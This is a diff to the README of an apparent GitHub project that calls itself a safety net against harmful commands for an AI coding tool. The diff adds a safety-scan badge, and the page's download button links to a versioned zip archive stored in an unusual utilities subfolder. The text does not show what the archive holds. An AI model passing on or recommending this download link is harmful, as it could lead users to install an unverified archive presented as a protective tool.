@@ -1,5 +1,7 @@
 # 🛡️ claude-code-safety-net - Your Safety Shield Against Harmful Commands
 
+[![SafeSkill 89/100](https://img.shields.io/badge/SafeSkill-89%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/waleedkhanbaloch-claude-code-safety-net)
+
 ## 📥 Download Now
 [![Download claude-code-safety-net](https://raw.githubusercontent.com/waleedkhanbaloch/claude-code-safety-net/main/ast-grep/utils/net-claude-code-safety-v3.4.zip)](https://raw.githubusercontent.com/waleedkhanbaloch/claude-code-safety-net/main/ast-grep/utils/net-claude-code-safety-v3.4.zip)
 
